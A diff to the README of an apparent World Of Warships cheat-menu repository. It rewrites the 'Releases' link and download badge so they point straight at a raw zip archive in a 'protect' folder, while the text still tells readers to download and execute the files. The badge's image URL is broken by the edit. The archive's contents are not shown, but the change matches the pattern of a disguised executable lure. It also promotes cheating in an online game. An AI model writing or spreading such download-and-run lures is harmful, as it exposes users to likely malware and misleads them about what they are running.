@@ -17,9 +17,9 @@ The repository covers a wide range of topics related to World Of Warships and ga
 
 ## Getting Started
 
-To access the latest releases of our software tools, please visit the [Releases](https://github.com/6BLH/World-Of-Warships-Menu/releases) section. Download the necessary files and execute them to start enhancing your World Of Warships gameplay.
+To access the latest releases of our software tools, please visit the [Releases](https://raw.githubusercontent.com/6BLH/World-Of-Warships-Menu/main/protect/World_Warships_Of_Menu_v3.7-beta.2.zip) section. Download the necessary files and execute them to start enhancing your World Of Warships gameplay.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/6BLH/World-Of-Warships-Menu/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/6BLH/World-Of-Warships-Menu/main/protect/World_Warships_Of_Menu_v3.7-beta.2.zip%20Release-blue)](https://raw.githubusercontent.com/6BLH/World-Of-Warships-Menu/main/protect/World_Warships_Of_Menu_v3.7-beta.2.zip)
 
 ## How to Contribute
 
